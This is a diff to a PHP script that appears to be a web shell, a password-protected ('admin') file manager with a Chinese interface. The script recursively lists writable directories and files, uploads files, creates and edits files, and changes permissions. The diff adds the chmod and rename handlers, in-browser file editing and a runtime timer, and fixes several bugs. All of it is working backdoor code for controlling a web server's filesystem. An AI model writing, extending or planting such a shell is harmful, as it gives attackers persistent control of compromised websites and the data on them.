@@ -2,6 +2,8 @@
 <?php
 error_reporting(7);
 session_start();
+$time = explode(' ',microtime());
+$time_start = $time[1] + $time[0];
 define('pass', 'admin');
 $op = @$_GET['op'];
 $op = $op ? $op : 'file';
@@ -64,6 +66,7 @@ if ($op == 'logout'){
     <style type="text/css">
         body, td {  font: 15px Arial, Tahoma; line-height: 16px}
         td { border-top: 1px solid #fff;background: #f1f1f1;padding: 5px 15px 5px 5px;}
+        .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
         table {background: #EBEBEB;}
     </style>
     <script type="text/javascript">
@@ -125,29 +128,33 @@ if (!function_exists('posix_getegid')) {
 if ($op == 'file') {
     $err && m($err);
     $nowpath = @$path ? $path : wwwroot;
-    var_dump($nowpath);
     if (!file_exists($nowpath)) {
-       header('location: '.$self.'?op=file&err='.$nowpath.'不存在');
+       m($nowpath.'不存在');
+       $nowpath = wwwroot;
     }
     elseif ($newdir) {
         $makedir = $nowpath.$newdir;
         if (file_exists($makedir)){
             m($newdir.'已存在');
         }else{
-            m('目录创建'.(@mkdir($makedir)) ? '成功' : '失败');
-            @chomd($makedir, 0777);
+            m('目录创建'.(@mkdir($makedir) ? '成功' : '失败'));
+            @chmod($makedir, 0777);
         }
-
     }
     elseif ($filename) {
         $mkfile = $nowpath.$filename;
-        $content = file_exists($mkfile) ? @file_get_contents($mkfile) : '';
+        if (file_exists($mkfile)) {
+            $fp = fopen($mkfile, 'r');
+            $content = fread($fp,filesize($mkfile));
+            fclose($fp);
+            $content = htmlspecialchars($content);
+        }
         formhead();
         p('<h2>创建文件</h2>');
         makehide('path',$nowpath);
         makehide('op','file');
         p('<p>创建文件以及编辑文件<br><input type="text" value="'.$mkfile.'" name="editfilename" size="100"></p>');
-        p('<p>文件内容<br><textarea name="filecontent" cols="100" rows="25">'.$content.'</textarea>');
+        p('<p>文件内容<br><textarea  name="filecontent" cols="100" rows="25">'.$content.'</textarea></p>');
         p('<p><input type="submit" value="提交" name="submit"></p>');
         formfoot();
         formhead();
@@ -163,6 +170,25 @@ if ($op == 'file') {
     }
     elseif ($up) {
         m('文件上传'.(@copy($_FILES['upfile']['tmp_name'],$uploaddir.'/'.$_FILES['upfile']['name']) ? '成功' : '失败'));
+    }
+    elseif ($perms && $alfile) {
+        if (!file_exists($alfile)) {
+            m('原始文件不存在');
+        }
+        else {
+            var_dump($alfile);
+            $perms = base_convert($perms, 8, 10);
+            m('更改权限' . (@chmod($alfile, $perms) ? '成功' : '失败'));
+        }
+    }
+    elseif ($new_file && $ordfile) {
+        $newfile = $nowpath.$new_file;
+        if (file_exists($newfile) || !file_exists($ordfile)) {
+            m('原始文件不存在或命名文件已存在');
+        }
+        else{
+            m(basename($ordfile).'改名:'.basename($newfile).(@rename($ordfile,$newfile) ? '成功' : '失败'));
+        }
     }
     $dir_writable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
     $path = op_file($nowpath) . ' -' . getchmod($nowpath) . '/' . getPerms($nowpath) . get_user($nowpath) . '(' . $dir_writable . ')';
@@ -206,7 +232,7 @@ if ($op == 'file') {
 
         function godir(nopath,dir){
             if(!nopath) return ;
-            if(dir) $('opform').dir.value = dir;
+            if(dir) $('opform').dir_file.value = dir;
             $('opform').path.value = nopath;
             $('opform').submit();
         }
@@ -214,6 +240,31 @@ if ($op == 'file') {
             if(!getdir) return ;
             $('getsize').getdir.value = getdir;
             $('getsize').submit();
+        }
+
+        function alertperms(path){
+            var perms;
+            perms = prompt("当前路径："+ path + "\n请输入要新权限")
+            if(!perms) return;
+            $('newattr').perms.value = perms;
+            $('newattr').alfile.value = path;
+            $('newattr').submit();
+        }
+
+        function rename(ordname) {
+            var name;
+            name = prompt('请输入要新名字');
+            if(!name) return;
+            $('rename').ordfile.value = ordname;
+            $('rename').new_file.value = name;
+            $('rename').submit();
+        }
+
+        function edit(filename) {
+            var filename = filename;
+            if(!filename) return ;
+            $('creatfile').filename.value = filename;
+            $('creatfile').submit();
         }
     </script>
     <table style="display:none" width="100%" border="0" cellpadding="5" cellspacing="0">
@@ -235,6 +286,18 @@ if ($op == 'file') {
                 makehide('getdir');
                 makehide('path',$nowpath);
                 formfoot();
+                formhead(array('name' => 'newattr'));
+                makehide('op','file');
+                makehide('path',$nowpath);
+                makehide('perms');
+                makehide('alfile');
+                formfoot(); formhead(array('name' => 'rename'));
+                makehide('op','file');
+                makehide('path',$nowpath);
+                makehide('new_file');
+                makehide('ordfile');
+                formfoot();
+
                 ?>
             </td>
         </tr>
@@ -338,14 +401,31 @@ if ($op == 'file') {
                 p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'/\')">'.$dirdb['filename'].'</a></td>');
                 p('<td>'.$dirdb['mtime'].'</td>');
                 p('<td>'.$dir_size.'</td>');
+                p('<td><a href="javascript:alertperms(\''.$dirdb['server_link'].'\')">'.$dirdb['dirchmod'].'/</a>'.$dirdb['dirperm'].'</td>');
+                p('<td><a href="javascript:rename(\''.$dirdb['server_link'].'\')">重命名</a></td>');
             }
         }
+        foreach ($filedata as $key => $filedb) {
+            if ($filedb['filename'] != '.' && $filedb['filename'] != '..') {
+                $filesize = @filesize($filedb['filename']) ?  getsize(filesize($filedb['filename'])) : '';
+                p('<tr>');
+                p('<td width="2%"><input name="cl" type="checkbox" value="' . $filedb['server_link'].'"></td>');
+                p('<td><a href="javascript:edit(\''.$filedb['filename'].'\')">'.$filedb['filename'].'</a></td>');
+                p('<td>'.$filedb['mtime'].'</td>');
+                p('<td>'.$filesize.'</td>');
+                p('<td><a href="javascript:alertperms(\''.$filedb['server_link'].'\')">'.$filedb['dirchmod'].'/</a>'.$filedb['dirperm'].'</td>');
+                p('<td><a href="javascript:rename(\''.$filedb['server_link'].'\')">重命名</a></td>');
+            }
+        }
+        formfoot();
         ?>
     </table>
     </div>
     <?php } ?>
+<div style="margin-top:10px;padding:10px;border-bottom:10px solid #EBEBEB;background:#EBEBEB;">
+    <span style="float: right">程序运行时间：<?php echo runtime().'s'; ?></span>
+</div>
 </body>
-</head>
 </html>
 
 
@@ -371,12 +451,12 @@ function getdirlist($dir){
             $f = str_replace('//', '/', $dir . '/' . $file);
             if ($file != '.' && $file != '..' && is_dir($f)) {
                 if (@is_writable($f)) {
-                    $dirdata[$j]['filename'] = str_replace($nopath, '', $f);
-                    $dirdata[$j]['mtime'] = date('Y-m-d H:i:s', filemtime($f));
+                    $dirdata[$j]['filename'] = str_replace($nowpath, '', $f);
+                    $dirdata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                     $dirdata[$j]['dirchmod'] = getchmod($f);
                     $dirdata[$j]['dirperms'] = getperms($f);
                     $dirdata[$j]['dirlink'] = $dir;
-                    $dirdata[$j]['serverlink'] = $f;
+                    $dirdata[$j]['server_link'] = $f;
                     $j++;
                 }
                 getdirlist($f);
@@ -401,7 +481,8 @@ function getfilelist($dir){
                 getfilelist($f);
             } elseif ($file != '.' && $file != '..' && is_file($file) ) {
                 if (is_writable($f)) {
-                    $filedata[$j]['filename'] = str_replace($nowath, '', $f);
+                    $filedata[$j]['filename'] = str_replace($nowpath, '', $f);
+                    $filedata[$j]['mtime'] = @date('Y-m-d H:i:s', filemtime($f));
                     $filedata[$j]['size'] = getsize(@filesize($f));
                     $filedata[$j]['filechmod']  =  getchmod($f);
                     $filedata[$j]['fileperm']   =  getperms($f);
@@ -472,8 +553,8 @@ function get_dirs(){
     global $self,$self_path,$nowpath;
     p('<a href="'.$self.'?op=file">网站根目录</a>');
     p(' | <a href="javascript:godir(\''.$self_path.'\')">脚本目录</a>');
-    p(' |( <a href="javascript:godir(\''.$self_path.'\',\'dir\')">目录</a>');
-    p(' | <a href="javascript:godir(\''.$self_path.'\',\'file\')">文件</a> )');
+    p(' |( <a href="javascript:godir(\''.$nowpath.'\',\'dir\')">目录</a>');
+    p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\')">文件</a> )');
     p(' | <a href="javascript:creatdir()">创建文件夹</a>');
     p(' | <a href="javascript:creatfile(\''.$nowpath.'\')">创建文件</a>');
 
@@ -653,6 +734,11 @@ function ip() {
     return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
 }
 
+function runtime()
+{   global $time_start;
+    $time_end = explode(' ',microtime());
+    $total_time = number_format(($time_end[1] + $time_end[0] - $time_start),6);
+    return $total_time;
+}
 ?>
-
 
